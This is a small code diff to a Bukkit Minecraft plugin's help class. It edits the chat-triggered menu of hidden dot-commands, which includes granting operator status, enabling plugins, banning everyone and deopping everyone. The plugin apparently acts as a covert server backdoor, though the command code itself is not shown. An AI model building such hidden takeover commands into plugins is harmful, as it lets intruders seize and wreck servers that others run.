@@ -7,7 +7,6 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_help implements Listener
 {
-
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
@@ -32,7 +31,7 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.GOLD + ".enableplugin <plugin> - Enables a plugin of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
-                p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> ");
+                p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> - Changes your gamemode.");
                 p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                 p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                 //p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
